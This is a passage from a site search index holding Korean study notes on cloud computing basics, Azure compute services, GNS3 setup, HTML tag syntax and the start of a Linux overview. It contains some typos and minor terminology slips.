실행 환경을 제공하며, 게스트 운영체제가 필요하지 않은 점에서는 VM과 흡사하지만, 대신 애플리케이션과 몯느 해당 종속성이 컨테이너에 패키지된 다음, 표준 런타임 환경이 앱을 실행하는 데 사용됩니다.\n  기본적으로 VM과의 가장 큰 차이는 운영체제의 유무에 대한 차이입니다.\n       서버리스 컴퓨팅   서버리스 컴퓨팅은 서버를 생성, 구성, 유지관리하지 않고 애플리케이션 코드를 실행하는 것이 가능합니다.\n  서버리스 컴퓨팅의 핵심개념은 애플리케이션이 일부 작업에 의해 트리거될 때 실행되는 별도의 기능으로 분리된다는 점이며, 이는 자동화 작업에 이상적입니다.\n  서버리스 모델은 기본적으로 사용하는 처리 시간에 대해서만 페이를 지불한다는 점에서 VM과 컨테이너와 성격이 다릅니다.\n        컴퓨팅 서비스 비교 다이어그램     스토리지    대부분의 디바이스 및 애플리케이션은 데이터를 읽고 사용합니다. 이러한 모든 경우의 데이터는 데이터를 읽거나, 쓰여지며 이에 딸느 데이터이 유형 및 저장방식은 경우의 마다 다를 수 있습니다.\n  일반적으로 클라우드 공급자는 이러한 모든 유형의 데이터를 처리할 수 있는 서비스를 제공하며, 클라우드 기반 데이터 스토리지는 사용자의 요구 사항에 맞게 확장할 수 있다는 장점이 있습니다.\n  예를 들면 자동적으로 저장공간을 확장 및 줄일 수 있으며 백업 파일을 저장할 수도 있습니다.\n     왜 클라우드 서비스인가? (클라우드 컴퓨팅의 혜택)    기본적으로 클라우드 서비스를 사용하는 것은 기존 비즈니스의 인프라 및 관리 비용을 점가하기 위해 사용하지만, 이는 순전히 선택사항입니다.\n  하단은 클라우드 서비스를 사용하는 이점을 나타냅니다.\n       비용효과적\n  클라우드 컴퓨팅은 종량제 또는 사용량 기반 가격 책정 모델을 제공합니다.\n  즉, 선불 인프라 비용이 없으며, 사용하지 않는 경우 비용이 청구되지 않아 비용을 절약할 수 있습니다.\n        확장가능\n  주말과 같은 특정 시간의 수요 또는 워크로드에 따라 사용되는 리소스와 서비스를 늘리거나 줄일 수 있습니다.\n  클라우드 서비스는 수직적, 수평적 크기 조정을 둘다 지원하며 수직적 크기 조정은 Scale UP, 수평적 크기 조정은 Scale OUT이라 합니다.\n  Scale UP은 한 서버에 리소스 추가시키는 것을 의미하며, Scale OUT은 서버를 여러 대 생성하여 트래픽을 분산시키는 것을 의미합니다.\n  이와 같은 기능들을 자동적으로 수행됩니다.\n        탄력적\n 수요 급증 또는 급감으로 인해 워크로드가 변경되면 클라우드 컴퓨팅 시스템은 자동으로 리소스를 추가하거나 제거하여 보정이 가능합니다.        최신상태\n 클라우드를 사용하면 애플리케이션을 빌드하고 배포하는 중요한 작업에 집중할 수 있습니다. 클라우드를 사용하면 소프트웨어 패치, 하드웨어 설치, 업그레이드 및 기타 IT 관리 작업을 유지 관리해야하는 부담을 줄일 수 있습니다.        안정적\n 클라우드는 컴퓨팅 공급자가 안정적으로 데이터를 유지할 수 있도록 백업, 재해 복구 및 데이터 복제 서비스를 제공하며, 장애가 발생하면 백업 구성 요소가 댓니 사용되며, 이를 내결함성이라 합니다.        전 세계 어디서든 사용가능\n 클라우드 공급 기업은 전 세계의 다양한 지역에 완벽하게 증복된 데이터 센터를 갖추고 있으며, 이로 가능한 최적의 응답 시간을 제공할 수 있습니다.        안전함\n 클라우드 공급자는 대부분의 조직에서 달성할 수 있는 것보다 더 낭느 보안을 제공할 수 있는 광범위한 정책, 기술, 제어 및 전문 기술을 제공합니다.       이를 온-프레미스의 환경과 비교해보면 하단의 장점들을 가지고 있습니다.   온-프레미스 환경은 고정비용이지만 퍼블릭 환경은 유동적으로 비용우위를 가질 수 있다.\n  온-프레미스 환경에서는 테스트 서버의 세팅에 많은 시간이 걸리지만, 퍼블릭 환경에서는 빠른 시간 내에 세팅이 가능한 생산성의 우위를 가질 수 있다.\n  이미 퍼블릭환경에서는 패키지로 플랫폼을 제공하기 때문에 직접 설치할 필요가 없어 진입장벽이 온-프레미스 환경에 비해서 낮다.\n        이와 같이 Azure는 여러 규정 준수 조건 및 요구 사항을 각 나라의 맞춰 설계되어있습니다.\n  규정 준수 참조\n     클라우드 컴퓨팅의 주요 개념 및 용어    위와 같이 클라우드 컴퓨팅의 가장 큰 특징은 탄력적이라는 면에 있으며, 과거 보안적인 문제도 점차 해결되어 가고 있습니다.\n  하단의 개념들은 현재 클라우드 컴퓨팅의 핵심이 되는 개념들을 나열한 것입니다.\n  내결함성 (Fault tolerance) : 특정 문제가 발생시에 에러를 복구하는 정도    고 가용성 (High availability) : 문제가 발생시에도 적은 다운타임으로 서비스를 제공할 수 있는 개념    재해 복구 (Disaster recovery) : 물리적으로 자연재해의 영향을 미치지 않는 장소에 서비스에 영향을 주지 않도록 구성하는 개념    확장성 (Scalability) : 서비스의 추가 자원이 필요할 시 보다 쉽게 자원을 추가하여 서비스를 제공할 수 있는 개념    민첩성 (Agility) : 특정 서비스의 필요 자원에 따라 자원을 추가\u0026amp; 감소를 빠른 속도로 이루는 개념    탄력성 (Elasticity) : 확장성과 비슷하다 할 수 있지만, 확장성과의 차이는 여유분의 자원이 남는 서비스의 자원을 수축하여 자원을 효율적으로 관리할 수 있는 개념    글로벌 지원(Global reach) : 해외의 데이터 센터들을 활용하여 해외의 서비스를 제공할 수 있다는 개념    응답 속도(Customer latency) : 해외의 여러 엔드 유저들에게도 적절한 리소스를 배치시켜 빠른 속도로 서비스를 제공해 줄 수 있는 개념    예측 비용(Predictive cost): 클라우드는 기본적으로 사용한 만큼의 과금할 수 있는 구조로 이루어져있어, 적절하게 비용의 에측이 가능하다는 개념    보안 (Security) : 각 나라의 지역적인 규제나 정책, 준수사항 등을 만족하도록 구현한다는 개념       규모의 경제    규모 경제의 개념은 작은 규모로 운영하는 것에 비해 큰 규모로 운용할 때 효율적으로 작업을 수행할 수 있는 능력을 제공하는 개념입니다.\n  클라우드는 큰 규모로 진행하기에, 낮은 비용 대비 고효율의 제공이 가능하는 것이 가능합니다.\n     CapEx vs OpEx   자본 지출 : Capital Expenditure (CapEx)   물리적 인프라에 대한 지출을 선불로 지불\n  시간이 지남에 따라 세금 계산서에서 비용을 공제\n  높은 초기 비용, 투자 가치는 시간이 지남에 따라 감소\n  기본적으로 일반적으로 CapEx 온-프레미스 데이터 센터에는 다음과 같은 비용이 포합됩니다.\n  서버 비용\n  스토리지 비용\n  네트워크 비용\n  백업 및 보관 비용\n  조직 연속성 및 재해 복구 비용\n  데이터 센터 인프라 비용\n  기술 인력\n  OpEx 클라우드 컴퓨팅 비용\n  임대 소프트에어 및 사용자 지정된 기능\n  고정 하드웨어나 용량 대신 사용/ 수요에 따라 요금을 조정\n  사용자 또는 조직 수준의 청구\n    이와 같이 CapEx는 시작 단계에서 비용을 계획하기 때문에, 제한된 예산으로 인해 프로젝트를 시작하기 전에 비용을 예측해야 하는 경우에 유용합니다.\n        운영 비용: Operational Expenditure (OpEx)\n  수요의 따른 시간, 비용 그래프   CapEx와 달리 초기 비용이 아닌, 필요에 따라 서비스 또는 제품에 지출되고 즉시 청구\n  같은 해에 세금 계산서에서 비용을 제공\n  선 결제 비용이 없고, 종량제 사용\n       클라우드의 소비 기반 모델   소비 기반 모델 : Consumption-based model   선 결제 비용이 존재하지 않음\n  비용이 많은 드는 인프라를 구매하고 관리할 필요가 없음음\n  필요할 시에만 사용하며, 필요하지 않으면 서비스를 중지할 수 있음\n       클라우드 서비스의 종류  퍼블릭 클라우드    클라우드 서비스 또는 호스팅 공급자가 소유\n  여러 조직과 사용자에게 리소스와 서비스를 제공\n  보안 네트워크 연결을 통해 접근 (일반적으로 인터넷으르 통해 접근)\n  중요한 데이터 등의 대한 관리문제가 존재할 수 있음\n  특징\n  CapEx 없음\n  응용 프로그램에 빠르게 엑세스가 가능한 민첩성을 가질 수 있음\n  클라우드 공급자가 일정 부분의 책임을 짐\n  소비 기반 모델\n  제한적인 요소로 인해클라이언트의 요구사항을 충족할 수 없는 경우가 발생할 수 있음\n  완전 자유롭게 관리하는 것이 사실상 불가능\n       프라이빗 클라우드    클라우드 리소스를 사용하는 조직이 소유 및 운영을 관리\n  조직은 자신들만의 데이터 센터에 클라우드 환경을 구축\n  조직에게 본인들이 제공하는 서비스를 운영할 책이 존재\n  특징\n  제어력\n  보안\n  초기의 CapEx 비용이 존재하며, 유지 관리를 위해 하드웨어를 추가구매할 경우가 발생\n  추가구매로 인한 민첩성이 제한을 받음\n  프라이빗 클라우드는 기본적으로 전문적인 IT 기술 및 전문 지식이 필요\n       하이브리드 클라우드    공용 및 사설 클라우드를 결합하여 응용 프로그램이 가장 적합한 위치에서 실행되도록 하는 클라우드 서비스\n  비용적인 측면에서는 높을 수 있음\n  특징\n  유동성\n  준수성\n  설정 및 관리가 복잡해질 수 있으며 전문적인 인재가 필요\n       클라우드 서비스의 유형   공동 관리 책임 (Shared responsibility model)    공동 관리 책임의 범위   On Premises   온-프레미스는 모든 책임을 사용자가 가짐\n  이아스는 네트워킹, 스토리지, 컴퓨팅 외에는 모든 책임을 사용자가 가짐\n  PaaS\n  사스는 대부분 클라우드 벤더에서 책임을 지며 데이터와 접근권한만을 책임을 가짐\n     Infrastructure as a Server (IaaS)    가장 기본적인 클라우드 컴퓨텅 서비스의 범주 (흔히 우리가 아는 Vm)\n  클라우드 공급자로부터 가상머신, 스토리지, 네트워크 및 운영 체제를 대여\n  네트워크를 통해 프로비저닝 받는 서비스\n     Platform as a Server (PaaS)    소프트웨어 응용 프로그램을 개발, 테스트 미 배포하기 위한 환경을 제공하는 서비스\n  기본적으로 개발환경과 비슷하며 인프라 관리에 신경쓰지 않고, 응용 프로그램을 신속하게 만들 수 있도록 제공하는 서비스\n     Software as a Server (SaaS)    최종 사용자를 위해 중앙에서 호스팅 되고 관리되는 소프트웨어\n  인터넷을 통해 클라우드 기반 앱에 연결하여 사용\n     각 클라우드 유형의 특징   IaaS(유동성)   IaaS는 가장 유연한 클라우드 서비스\n  애플리케이션을 실행하는 운영체제를 구성하고 관리할 수 있는 제어력을 가지고 있음\n       PaaS(생산성)   사용자는 응용 프로글매 개발에만 집중할 수 있음\n  플랫폼 관리는 클라우드 공급자가 처리\n        SaaS(종량제)\n 사용자는 자신의 서비스에서 사용하는 소프트웨어에 대한 비용만 지불      "}),a.add({id:145,href:'/docs/azure/microsoftazure/azure00/',title:"Azure Computing",content:"Azure Computing     Azure Computing은 클라우드 기반의 애플리케이션을 실행하기 이한 주문형 컴퓨팅 서비스로 가상 머신 및 컨테이너를 통해 멀티 코어 프로세서, 슈퍼 컴퓨팅 리소스를 제공합니다.\n  Azure Computing은 애플리케이션 및 서비스를 호스팅하는 다양한 옵션을 제공합니다.\n     Azure Virtual Machines     가상 머신 또는 VM은 무리적 컴퓨터의 소프트웨어 에뮬레이션입니다.\n  VM에는 가상 프로세서, 메모리, 스토리지 및 네트워킹 리소스가 포함됩니다.\n     Azure Virtual Machine Scale Sets    Azure에서 호스팅되는 Windows 또는 Linux VM의 크기 조정 서비스로 부하 분사된 동일한 가상 머신 그룹을 만들고 관리할 수 있습니다.\n  Scale Sets를 사용하면 몇 분 안에 많은 수의 가상 머신을 중앙에서 관리, 구성 및 업데이트 하므로 고가용성 애플리케이션을 제공할 수 있습니다.\n     Azure Kubernetes Service   컨테이너화된 서비스를 실행하는 VM 클러스터 관리를 사용하도록 설정     Azure Service Fabric  분산형 시스템 플랫폼. Azure 또는 온-프레미스에서 실행     Azure Batch    Azure Batch를 통해 수십, 수백 또는 수천 개의 가상 머신으로 확장할 수 있을 뿐 아니라 대규모 작업을 예약하고 컴퓨팅을 관리하는 서비스 입니다.\n  병렬 및 고성능 컴퓨팅 애플리케이션을 위한 관리 서비스\n     Azure Container Instances    애플리케이션을 실행하기 위한 사상화 환경으로, 컨테이너는 가상 머신과 마찬가지로 호스트 운영 체제에서 실행됩니다.\n  하지만 서버 또는 VM을 프로비저닝하지 않고 Azure에서 컨테이너화된 앱 실행하며 기존 호스트 OS를 사용하는 데 필요한 라이브러리와 구성 요소를 포함합니다.\n     Azure Functions    이벤트 기반의 서버리스 컴퓨팅 서비스로 클라우드에 호스트된 실행 환경이지만, 기본 호스팅 환경을 완전히 추상화합니다.\n  가장 큰 특징으로는 인프라 구성 또는 유지 관리가 필요하지 않거나 허용되지 않습니다.\n     Azure App Service   Azure App Service를 사용하면 인프라를 관리할 필요 없이 원하는 프로그래밍 언어로 웹앱, 백그라운드 작업, 모바일 백 엔드 및 RESTful API를 빌드하고 호스트할 수 있습니다.    "}),a.add({id:146,href:'/docs/network/network/gns3/',title:"GNS3",content:"네트워크 실습을 위한 GNS3 설치    GNS3 Download Link      상단의 GNS3 다운로드 링크를 클릭하여 GNS3에 접속 후, 로그인 혹은 회원가입을 진행합니다.      로그인 후, Download를 클릭하여 운영체제에 맞는 GNS3 설치파일을 다운로드 합니다.      기본 값으로 설치를 진행합니다. 단 솔라윈드 톨킷은 설치하지 않습니다.      GNS3의 설치가 완료되었습니다.      GNS3가 설치되면 GNS3를 실행시킵니다. 설정에 맞는 사항을 체크합니다. 여기서는 첫 번째 항목을 체크하겠습니다. 1. Run appliances in a virtual machine  가상 머신을 통하여 최신 IOS를 포함한 IOSv, IOU, ASA와 다른 Vendor의 Appliance들을 작동시킨다. 단 이 첫 번째 세팅은 설명에서 요구하듯이 GNS3 VM을 요구한다.   2. Run appliances on my local computer  로컬 컴퓨터, 즉 가상 머신이나 다른 서버를 통하지 않고 자신의 컴퓨터 내부에서 Appliance들을 작동시킨다.   3. Run appliances on a remote server (advanced usage)  자신의 컴퓨터, 자신의 가상 머신이 아닌 외부 서버의 컴퓨터, 외부 서버의 가상 머신에서 Appliance들을 작동시킨다.  \r      다음으로는 서버의 경로와 호스트 주소, 포트번호를 설정하는 화면이 나옵니다. 여기서는 기본 값으로 설치를 진행하겠습니다.      다음은 VMware 혹은 VirtBOX를 GNS3의 연동합니다. 에러가 따는 경우 VIX를 설치 후 진행합니다.                          "}),a.add({id:147,href:'/docs/development/web/html/',title:"HTML 문법",content:"HTML   \rHTML 기본양식\r...\r\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt;\r\u0026lt;style\u0026gt;\r\u0026lt;/style\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;/body\u0026gt;\r \r\r\r  태그   줄 바꾸기 \u0026lt;br\u0026gt;  구분선 \u0026lt;hr\u0026gt;  제목 \u0026lt;h1- h6\u0026gt; \u0026lt;/hn\u0026gt;  문단 \u0026lt;p\u0026gt; \u0026lt;/p\u0026gt;  입력을 그대로 표시하는 태그 \u0026lt;pre\u0026gt; \u0026lt;/pre\u0026gt;  인용문을 넣는 태그 \u0026lt;blockquote\u0026gt; \u0026lt;/blockquote\u0026gt;  인용문을 인 라인에 넣는 태그 \u0026lt;q\u0026gt; \u0026lt;/q\u0026gt;   text   밑줄 \u0026lt;u\u0026gt; \u0026lt;/u\u0026gt;  굵은 텍스트 \u0026lt;b\u0026gt; \u0026lt;/b\u0026gt;  텍스트 강조 \u0026lt;strong\u0026gt; \u0026lt;/strong\u0026gt;  형광펜 텍스트 \u0026lt;mark\u0026gt;\u0026lt;/mark\u0026gt;  동아시아 글자 표시 rt는 읽는 방법표기법 \u0026lt;ruby\u0026gt; \u0026lt;rt\u0026gt; \u0026lt;/rt\u0026gt; \u0026lt;/ruby\u0026gt;  이탤릭 체 Emphasized tag \u0026lt;em\u0026gt; \u0026lt;/em\u0026gt;  줄 찍 \u0026lt;del\u0026gt; \u0026lt;/del\u0026gt;  인설트 태그 \u0026lt;ins\u0026gt; \u0026lt;/ins\u0026gt;  This is \u0026lt;sub\u0026gt; sub \u0026lt;sub\u0026gt; text \u0026lt;/sub\u0026gt; \u0026lt;/sub\u0026gt; \u0026lt; \u0026gt; 태그 요소 \u0026amp;lt; \u0026amp;gt;  스페이스바 \u0026amp;nbsp; 약자 속성, title 속성을 함께 사용가능 \u0026lt;addr\u0026gt; \u0026lt;/addr\u0026gt;  포스트에서 참고 내용을 표시 \u0026lt;cite\u0026gt; \u0026lt;/cite\u0026gt;  컴퓨터 인식코드 \u0026lt;code\u0026gt; \u0026lt;/code\u0026gt;  키보드, 음성 입력 \u0026lt;kbd\u0026gt; \u0026lt;/kbd\u0026gt;  작게 표시 (부가정보) \u0026lt;small\u0026gt; \u0026lt;/small\u0026gt;  아래 첨자 \u0026lt;sub\u0026gt; \u0026lt;/sub\u0026gt;  위 첨자 \u0026lt;sup\u0026gt; \u0026lt;/sup\u0026gt;  취소선 \u0026lt;s\u0026gt; \u0026lt;/s\u0026gt;   List  #list \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; ul의 종류: disc, circle, sqaure, none \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;ol\u0026gt; ol의 종류: 1, i, l, a, A, none \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt; \u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt; \u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt; \u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;h1 style= \u0026#34; 설정 값 \u0026#34; \u0026gt; \u0026lt;/h1\u0026gt; p { color : xx; background: xx; adding: xx; } xx-color: rgb(x,x,x); #xxxxxx; hsl(x,x%,x%)   링크태그   인터넷 링크 \u0026lt;a href=\u0026#34;링크할 주소\u0026#34; [속성=\u0026#34;속성 값\u0026#34;]\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;a href =\u0026#34;도메인 주소\u0026#34;\u0026gt; \u0026lt;/a\u0026gt; a 태그 안에서 사용 가능한 요소 href 링크한 문서나 사이트의 주소를 입력 target 링크한 내용이 표시될 위치를 지정 target =\u0026#34;_blank\u0026#34; 링크 내용이 새 창이나 새 탭에서 열림 열림 표시 전체 화면에 표시 download 링크한 내용을 보여주는 것이 아니라 다운로드 rel 현재 문서와 링크한 문서의 관계를 알려줌 hreflang 링크한 문서의 언어를 지정 type 링크한 문서의 파일 유형을 알려줌 a 대신 iframe을 사용시 액자식 구성 사용 가능 앵커 기능 \u0026lt;태그 id=\u0026#34;앵커 이름\u0026#34;\u0026gt; 텍스트 또는 이미지\u0026lt;/태그\u0026gt; \u0026lt;a href=\u0026#34;#앵커 이름\u0026#34;\u0026gt;텍스트 또는 이미지\u0026lt;/a\u0026gt;   이미지 링크  \u0026lt;img src=\u0026quot;이미지의 경로\u0026quot; 속성값=\u0026quot;\u0026quot;\u0026gt;\rwidth=\u0026quot;n\u0026quot;\r이미지의 넓이를 지정\rheight=\u0026quot;n\u0026quot;\r이미지의 높이를 지정\ralt=\u0026quot;설명\u0026quot;\r이미지의 설명을 지정\r\u0026lt;figure\u0026gt; 요소 \u0026lt;/figure\u0026gt;\r\u0026lt;figcaption\u0026gt; 설명 \u0026lt;/figcaption\u0026gt;\r요소로 묶은 것에 대한 설명을 붙임\r\u0026lt;map name=\u0026quot;이름\u0026quot;\u0026gt;\r\u0026lt;area\u0026gt;\r\u0026lt;area shape=\u0026quot;rect\u0026quot; coords=\u0026quot;n,n,n,n\u0026quot; href=\u0026quot;주소\u0026quot; alt=\u0026quot;설명\u0026quot;\u0026gt;\r...\r\u0026lt;/map\u0026gt;\r\u0026lt;img src=\u0026quot;이미지 파일\u0026quot; usemap=\u0026quot;#맵이름\u0026quot;\u0026gt;\r맵의 속성\ralt\r대체할 텍스트를 지정\rcoords\r링크로 사용할 영역을 시작 좌표와 끝 좌표를 이용해 지정\rdownload\r링크를 클릭했을 때 링크 문서를 다운로드\rhref\r링크 문서(사이트) 경로를 지정\rmedia\r링크 문서(사이트)를 어떤 미디어에 최적화시킬지 지정\rrel\r현재 문서와 링크 문서 사이의 관계를 지정\rshape\r링크로 사용할 영역의 형태를 지정\rtarget\r링크를 표시할 대상을 지정\rtype\r링크 문서의 미디어 유형을 지정\r#talbe\r\u0026lt;table\u0026gt;\r\u0026lt;th\u0026gt;제목 칸\u0026lt;/th\u0026gt;\r\u0026lt;tr\u0026gt; 1행\r\u0026lt;th\u0026gt; 1열 \u0026lt;/th\u0026gt;\r\u0026lt;td colspan=\u0026quot;2\u0026quot;\u0026gt;\u0026lt;/td\u0026gt;\r\u0026lt;tr\u0026gt; 2행\r\u0026lt;th\u0026gt; 1열 \u0026lt;/th\u0026gt;\r\u0026lt;td rowspan=\u0026quot;2\u0026quot;\u0026gt;\u0026lt;/td\u0026gt;\r\u0026lt;/table\u0026gt;\r\u0026lt;caption\u0026gt; \u0026lt;/caption\u0026gt;\rtable 태그 뒤에 오며 표 제목\r\u0026lt;figcaption\u0026gt; \u0026lt;/figcaption\u0026gt;\r제목을 표 앞이나 뒤에 붙일 수 있음\r\u0026lt;p id=\u0026quot;summary\u0026quot;\u0026gt; 설명\u0026lt;/p\u0026gt;\r\u0026lt;talbe aria-describedby=\u0026quot;summary\u0026quot;\u0026gt;\r서머리의 설명 값을 출력\r\u0026lt;/talbe\u0026gt;\r\u0026lt;colgroup\u0026gt;\r\u0026lt;col style=\u0026quot;\u0026quot;\u0026gt;\r\u0026lt;col span=\u0026quot;n\u0026quot;\u0026gt;\r\u0026lt;/colgroup\u0026gt;\r inline 타그\n#form tag\r\u0026lt;form 속성=\u0026quot;속성 값\u0026quot;\u0026gt; 여러 폼 요소\u0026lt;/form\u0026gt;\rform 태그의 속성\rmethod\r사용자가 입력한 내용들을 서버 쪽 프로그램으로 어떻게 넘겨줄지 지정합니다.\rget - 주소 표시줄을 사용자가 입력한 내용이 그대로 드러납니다.\rpost - 대부분 이 방식을 이용 입력 내용에 길이에 제한을 받지 않음\rname\r폼의 이름을 지정\raction\r태그 안의 내용들을 처리해 줄 서버 상의 프로그램을 지정\rtarget\r태그에서 지정한 스크립트 파일을 현재 창이 아닌 다른 위치에서 열도록 지정\rautocomplete\r자동완성기능 (자동으로 켜져있음)\r\u0026lt;label [속성 =\u0026quot;속성 값\u0026quot;] \u0026gt; 레이블 \u0026lt;input ...\u0026gt; \u0026lt;/label\u0026gt;\r\u0026lt;label for=\u0026quot;id이름\u0026quot;\u0026gt; 레이블 \u0026lt;/label\u0026gt;\r\u0026lt;input id=\u0026quot;id이름\u0026quot; [속성 = \u0026quot;속성 값\u0026quot;]\u0026gt;\r\u0026lt;fieldset [속성=\u0026quot;속성 값\u0026quot;]...\u0026gt; \u0026lt;/fieldset\u0026gt;\r태그 사이의 폼들을 하나의 영역으로 묶어 줌\r\u0026lt;legend\u0026gt; 제목 \u0026lt;/legend\u0026gt;\rfieldset의 안에 사용하며 내용을 나눠주는 데 사용되어짐\r input 태그  \u0026lt;input type=\u0026quot;유형\u0026quot; [속성 =\u0026quot;속성 값\u0026quot;]\u0026gt;\rinput 타입의 요소\rhidden\r사용자에게 보이지 않지만 서버로 넘겨지는 값을 가짐\rtext\r한 줄 짜리 텍스트를 입력할 수 있는 상자를 넣음\rname - 텍스트 필드를 구별할 수 있도록 이름을 붙임\rsize - 텍스트 필드의 길이를 지정\rvalue - 텍스트 필드 요소가 화면에 표시될 때 텍스트 필드 부분에 표시될 내용\rmaxlengh - 텍스트 필드에 입력할 수 있는 최대 문자 개수\r\u0026lt;textarea name=\u0026quot;\u0026quot; id=\u0026quot;\u0026quot; cols=\u0026quot;30\u0026quot; rows=\u0026quot;10\u0026quot;\u0026gt;\u0026lt;/textarea\u0026gt;\rsearch\r검색상자\rtel\r전화번호 입력 필드\rurl\rURL 주소 입력 필드\remail\r메일 주소 입력 필드\rpassword\r비밀번호 입력 필드\rdatetime\r국제 표준시로 설정된 날짜와 시간\rdatetime-local\r사용자가 있는 지역을 기준 지정\rdate\rmonth\rweek\rtime\r사용자가 있는 지역을 기준으로 지정\rmin 날짜나 시간의 최솟값을 지정\rmax 날짜나 시간의 최댓값을 지정\rstep 스핀 박스의 화사룦를 누를 때마다 날짜나 시간을 얼마나 조절할지를 지정\rvalue 화면에 표시할 초기값을 지정\rnumber\r숫자를 조절할 수 있는 화살표를 지정\rrange\r숫자를 조절할 수 있는 슬라이드 막대를 넣음\rmin - 필드에 입력할 수 있는 최솟값을 지정\rmax - 필드에 입력할 수 있는 최댓값을 지정\rstep - 짝수나 홀수 등 특정 숫자로 제한하려고 할 떄 숫자 간격을 지정할 수 있음\rvalue - 필드에 표시할 초기 값\rcolor\r색상표를 넣음\rcheckbox\r주어진 항목에서 2개 이상 선택 가능한 체크 박스를 넣음\rradio\r주어진 항목에서 1개만 선택할 수 있는 라이도 버튼을 넣음\rname - 이름 값을 지정\rvalue - 필수 속성이며 서버로 알려줄 값\rchecked - 체크 되어 있는지 아닌지 기본 0 file\r파일을 첨부할 수 있는 버튼을 넣음\rsubmit\r서버 전송 버튼을 넣음\rimage\rsubmit 버튼 대신 사용할 이미지를 넣음\rreset\r리셋 버튼을 넣음\rbutton\r버튼을 넣음\rautofocus\r실행시 여기 칸으로 실행\rplaceholder\r힌트 표시하기\rreadonly\rtrue or false 읽기전용으로 바꿈\rrequired\r필수 값\rformaction\r실행할 프로그램을 연결 submit, image일 때 사용가능\rformenctype\r서버로 전송할 때의 폼 데이터를 결정 submit, image일 때 사용가능\rformmethod\r서버로 전송하는 방식 get, post를 지정\rformnovalidate\r유효성 여부를 확인\rmultiple 여러 값을 입력\rselect\r여러 선택사항 표시\r\u0026lt;select 속성=\u0026quot;속성 값\u0026quot;\u0026gt;\r\u0026lt;option value=\u0026quot;값\u0026quot; [속성=\u0026quot;속성 값\u0026quot;]\u0026gt; 내용1\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;값\u0026quot; [속성=\u0026quot;속성 값\u0026quot;]\u0026gt; 내용2\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;값\u0026quot; [속성=\u0026quot;속성 값\u0026quot;]\u0026gt; 내용3\u0026lt;/option\u0026gt;\r\u0026lt;/select\u0026gt;\r속성값 size, multiple\r\u0026lt;option\u0026gt;태그의 속성\rvalue, selected(화면에 표시될 때 기본 속성)\r\u0026lt;optgroup label= \u0026quot;제목\u0026quot;\u0026gt; \u0026lt;/optgroup\u0026gt;\r옵션끼리 묶기\r\u0026lt;datalist id=\u0026quot;값\u0026quot;\u0026gt;\r\u0026lt;option value=\u0026quot;값\u0026quot; label=\u0026quot;값\u0026quot;\u0026gt;\u0026lt;/option\u0026gt;\r\u0026lt;/datalist\u0026gt;\rbutton\r\u0026lt;button [type=\u0026quot;submit | reset | button\u0026quot;]\u0026gt; 내용 \u0026lt;/button\u0026gt;\r\u0026lt;output [속성=\u0026quot;속성 값\u0026quot;]\u0026gt; 내용 \u0026lt;/output\u0026gt;\r\u0026lt;progress value = \u0026quot;값\u0026quot; [max = \u0026quot;값\u0026quot;]\u0026gt; \u0026lt;/progress\u0026gt;\r 데이터를 전송하는 용도로 사용되는 태그 Form 내부에 입력된 데이터를 서버로 전송하거나 JavaScript에서 사용할 수 있다\naction attribute 데이터가 전송될 곳의 주소를 입력\nmethod attribute 데이터가 전송될 방식을 입력\n #style\r#sns \u0026gt; ul \u0026gt; li{\r가능\r}\r   input 태그   \u0026lt;form action=\u0026#34;14_entity.html\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name =\u0026#34;id\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;input name =\u0026#34;pw\u0026#34; type=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;type = \u0026#34; text, password, radio, checkbox, color, date, email, file\u0026#34;\u0026gt; = \u0026#34;range\u0026#34; min =\u0026#34;n\u0026#34; max=\u0026#34;n\u0026#34; "}),a.add({id:148,href:'/docs/system/linux/linux/',title:"Linux 개요",content:"Linux   Linux 기초   유닉스 기반의 컴퓨터 운영체제의 한 종류 핀란드 헬싱키 대학의 대학원생 리누스 토발즈가 1991년에 개발 오픈 소스의 운영체제 대표적인 리눅스 기관 GNU 높은 이식성과 확정성 ( C언어 기반 ) 안전성과 신뢰성 ( 국제적이고 개방적으로 개발되었기 때문에 문제점에 대한 대처가 빠름 ) 계층적 파일 시스템 ( 최상위 디렉토리가 존재하고 모든 것들은 해당 디렉토리 하부에 존재 )   유닉스 운영체제 종류  리눅스의 구성요소   명령어 : 사용자가 원하는 프로그램을 콜링\n  쉘 : 명령어를 컴퓨터가 알아들을 수 있는 언어로 번역\n  커널 : 운영체제의 핵심부분 ( 하드웨어 관리 및 사용자의 명령어 전달 )\n  H/W : 물리적 장비\n   Linux의 명령 프롬프트  명령어가 기다리고 있음을 가리키기 위해 화면에 나타나는 표시 일반적으로 리눅스의 프롬프트는 현재 작업 디렉토리, 현재 로그인한 사용자 등에 대한 정보를 표시  명령줄 인터페이스\n 텍스트 터미널을 통해 사용자와 컴퓨타가 상호 작용하는 방식을 뜻함 즉, 작업 명령은 사용자가 컴퓨터 키보드 등을 통해 문자열의 형태로 입력하며 컴퓨터로부터의 출력 역시 문자열의 형태로 주어진다.   명령어의 구조\n 명령어 : 시스템에서 특정 작업을 하기 위해 실행하는 실행파일, 프로그램 옵션 : 명령어를 어떻게 실행할 것인지 지정 ( 일반적으로 대시 ( - ) 문자 뒤에 옵션을 지정 ) 아규먼트 ( Argument ) : 명령어에 의해서 영향을 받는 